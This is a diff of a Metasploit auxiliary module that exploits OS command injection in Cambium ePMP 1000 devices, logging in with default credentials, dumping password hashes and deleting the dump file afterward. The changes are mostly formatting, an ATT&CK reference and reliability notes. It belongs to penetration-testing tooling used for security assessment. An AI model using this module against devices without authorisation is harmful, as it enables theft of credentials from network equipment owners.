@@ -7,25 +7,31 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::EPMP
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => "Cambium ePMP 1000 'ping' Password Hash Extractor (up to v2.5)",
-      'Description' => %{
+    super(
+      update_info(
+        info,
+        'Name' => "Cambium ePMP 1000 'ping' Password Hash Extractor (up to v2.5)",
+        'Description' => %q{
           This module exploits an OS Command Injection vulnerability in Cambium
           ePMP 1000 (<v2.5) device management portal. It requires any one of the
           following login credentials - admin/admin, installer/installer, home/home - to
           dump system hashes.
-      },
-      'References' =>
-        [
+        },
+        'References' => [
           ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/'],
-          ['URL', 'https://support.cambiumnetworks.com/file/476262a0256fdd8be0e595e51f5112e0f9700f83']
+          ['URL', 'https://support.cambiumnetworks.com/file/476262a0256fdd8be0e595e51f5112e0f9700f83'],
+          ['ATT&CK', Mitre::Attack::Technique::T1003_OS_CREDENTIAL_DUMPING]
         ],
-      'Author' =>
-        [
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'License' => MSF_LICENSE
-     )
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
     )
 
     register_options(
@@ -105,10 +111,10 @@ class MetasploitModule < Msf::Auxiliary
       )
 
       if good_response
-        print_status("#{rhost}:#{rport} - Dumping password hashes")
+        print_status("#{Rex::Socket.to_authority(rhost, rport)} - Dumping password hashes")
 
         path = store_loot('ePMP_passwd', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 password hashes')
-        print_status("#{rhost}:#{rport} - Hashes saved in: #{path}")
+        print_status("#{Rex::Socket.to_authority(rhost, rport)} - Hashes saved in: #{path}")
 
         # clean up the passwd file from /www/
         command = 'rm /www/' + random_filename
@@ -140,10 +146,10 @@ class MetasploitModule < Msf::Auxiliary
         )
       else
         check_file_uri = "#{(ssl ? 'https' : 'http')}" + '://' + "#{rhost}:#{rport}" + '/' + random_filename
-        print_error("#{rhost}:#{rport} - Could not retrieve hashes. Try manually by directly accessing #{check_file_uri}.")
+        print_error("#{Rex::Socket.to_authority(rhost, rport)} - Could not retrieve hashes. Try manually by directly accessing #{check_file_uri}.")
       end
     else
-      print_error("#{rhost}:#{rport} - Failed to dump hashes.")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to dump hashes.")
     end
   end
 
